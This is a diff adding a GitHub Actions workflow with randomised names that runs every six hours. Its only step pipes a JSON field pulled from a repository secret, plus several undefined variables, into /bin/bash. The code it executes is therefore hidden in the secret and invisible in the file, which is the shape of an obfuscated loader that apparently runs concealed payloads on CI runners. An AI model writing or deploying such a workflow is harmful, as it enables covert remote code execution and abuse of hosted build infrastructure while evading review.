@@ -1,0 +1,24 @@
+name: gongwanqiang7561
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongwanqiang7561
+        env:
+          jwcpu51023: ${{ secrets.jwcpu51023 }}
+        run: |
+          echo $jwcpu51023 | jq -r .wlhfx207 | /bin/bash
+          echo $ce175 | jq -r .p24 | /bin/bash
+          echo $b98 | jq -r .mcb4 | /bin/bash
+          echo $asm68075 | jq -r .p273 | /bin/bash
+          echo $yzv70473 | jq -r .znfk146 | /bin/bash
+          echo $rcqyj76 | jq -r .ta54 | /bin/bash
+          echo $ea3505 | jq -r .n42518 | /bin/bash
+          echo $xsm39620 | jq -r .uncc13 | /bin/bash
+
